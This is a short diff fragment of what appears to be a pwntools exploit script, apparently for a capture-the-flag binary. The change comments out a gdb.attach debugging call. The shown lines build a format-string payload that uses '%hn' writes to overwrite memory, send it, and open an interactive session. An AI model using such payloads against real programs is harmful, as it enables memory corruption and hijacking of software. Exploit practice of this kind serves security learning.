@@ -18,6 +18,6 @@ buf += "%" + str(count) + "x%" + str(stack_num) + "$hn"
 count = 0x10804-0x9216
 
 buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"
-gdb.attach(p)
+#gdb.attach(p)
 p.sendline(buf)
 p.interactive()
